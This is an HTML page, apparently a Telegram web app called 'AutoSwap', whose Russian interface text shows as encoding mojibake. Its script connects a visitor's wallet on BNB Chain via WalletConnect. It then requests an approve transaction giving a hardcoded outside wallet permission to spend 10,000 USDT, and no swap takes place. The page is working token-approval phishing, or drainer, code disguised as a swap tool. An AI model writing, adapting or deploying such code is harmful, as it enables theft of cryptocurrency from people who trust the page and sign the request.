<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AutoSwap ‚Äî approve USDT to Wallet</title>
  <style>
    /* –ß—ë—Ä–Ω—ã–π —Ñ–æ–Ω –≤—Å–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã */
    body {
      margin: 0;
      padding: 20px;
      background-color: #000;
      color: #e0e0e0;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 30px;
    }
    canvas {
      display: block;
      margin: 20px auto;
    }
    #manual-uri {
      margin-top: 10px;
      font-size: 14px;
      word-break: break-all;
      background: rgba(255,255,255,0.05);
      padding: 10px;
      border-radius: 8px;
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
      white-space: pre-wrap;
    }
    a.uri-link {
      color: #4fc3f7;
      text-decoration: underline;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî approve USDT</h1>
    <canvas id="qrcode"></canvas>
    <div id="manual-uri">URI –±—É–¥–µ—Ç –∑–¥–µ—Å—å</div>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
    import { ethers } from 'https://esm.sh/ethers@6.14.3';
    const { Interface, parseUnits, getAddress } = ethers;

    const setStatus = (msg, color = "#4fc3f7") => {
      const el = document.getElementById("status");
      el.textContent = msg;
      el.style.color = color;
    };

    const setURI = (uri) => {
      const el = document.getElementById("manual-uri");
      el.textContent = uri;
    };

    async function runApp() {
      try {
        setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect‚Ä¶");
        const client = await SignClient.init({
          projectId: "d868f90cd734355ae0328f8f0258b6b1",
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap Approve Flow",
            description: "Approve USDT ‚Üí Wallet",
            url: location.href,
            icons: ["https://walletconnect.com/favicon.ico"]
          }
        });

        setStatus("üì∑ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ QR‚Äë–∫–æ–¥–∞‚Ä¶");
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              chains: ["eip155:56"],
              methods: ["eth_sendTransaction"],
              events: ["chainChanged", "accountsChanged"]
            }
          }
        });

        if (uri) {
          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width: 240, margin: 1 });
          setURI(uri);
          setStatus("üì± –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –∏–ª–∏ –≤—Å—Ç–∞–≤—å—Ç–µ URI –≤—Ä—É—á–Ω—É—é");
        }

        const session = await approval();
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");

        const amount = parseUnits("10000", 18);
        const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
        const receiverWallet = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");

        setStatus("‚úçÔ∏è –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ approve‚Ä¶");
        const abi = new Interface(["function approve(address,uint256)"]);
        const data = abi.encodeFunctionData("approve", [receiverWallet, amount]);

        setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve‚Ä¶");
        const txHash = await client.request({
          topic: session.topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: usdt, data }]
          }
        });

        setStatus(`‚úÖ Approve –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:\n${txHash}`, "#66bb6a");
      } catch (e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message || e.reason}`, "#ff6b6b");
      }
    }

    runApp();
  </script>
</body>
</html>
